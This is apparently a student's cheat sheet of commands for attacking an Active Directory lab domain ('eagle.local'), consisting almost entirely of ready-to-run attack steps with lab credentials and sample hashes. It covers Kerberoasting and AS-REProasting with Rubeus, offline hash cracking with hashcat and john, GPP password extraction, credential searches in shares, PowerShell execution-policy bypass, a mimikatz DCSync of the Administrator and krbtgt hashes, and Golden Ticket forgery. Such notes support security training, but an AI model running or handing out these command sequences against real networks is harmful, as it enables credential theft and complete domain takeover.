



# Introduction

## Connect to WS001 via RDP

```
xfreerdp /u:eagle\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution
```
#xfreerdp 
## Connect to Kali via SSH

```
 ssh kali@TARGET_IP
```
#ssh 
## Moving files between WS001 and your Linux attacking machine

```
smbclient \\\\TARGET_IP\\Share -U eagle/administrator%Slavi123
```
#smbclient 

# kerberoasting

```c
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt
```
#rubeus #powershell 

```
$ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
```
#hashcat 


```
$ sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
```
#john 


# AS-REProasting

```C
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt
```
#rubeus #powershell 
For `hashcat` to be able to recognize the hash, we need to edit it by adding `23$` after `$krb5asrep$`:

```shell-session
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550
```



```
$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```
#hashcat 



# GPP Passwords

	Used to bypass powershell script execution policy.
```C
PS C:\Users\bob\Downloads> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```
#powershell #set-executionpolicy


```C
PS C:\Users\bob\Downloads> Import-Module .\Get-GPPPassword.ps1
PS C:\Users\bob\Downloads> Get-GPPPassword
```
#powershell #import-module #gppassword



# Credentials in Shares

	Used to load the `PowerView.ps1` module into memory
```
Import-Module .\PowerView.ps1
```
#powershell  #powerview

		This function allows specifying that default shares should be filtered out (such as `c$` and `IPC$`) and also check if the invoking user has access to the rest of the shares it finds.
```
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
```
#powershell #shares

```
cd \\Server01.eagle.local\dev$
```


```c
findstr /m /s /i "pass" *.bat
```
#findstr 


# Credentials in Object Properties

	Script to look for specific terms in the `Description` and `Info` fields of an AD object
```
.\SearchUser.ps1 -Terms pass
```
#powershell #searchuser



# DCSync



```
runas /user:eagle\rocky cmd.exe
```
#runas

```
mimikatz.exe lsadump::dcsync /domain:eagle.local /user:Administrator
```
#mimikatz #dcsync #lsa 



# Golden Ticket


```
mimikatz.exe lsadump::dcsync /domain:eagle.local /user:krbtgt
```
#mimikatz #lsa #dcsync 


```powershell-session
 powershell -exec bypass
```
#powershell #bypass

```
. .\PowerView.ps1
PS C:\Users\bob\Downloads> Get-DomainSID
```
#powerview 


```
mimikatz.exe 
kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```
#mimikatz #golden_ticket 


```
klist
```
#klist

```c
C:\Mimikatz>dir \\dc1\c$
```
#dir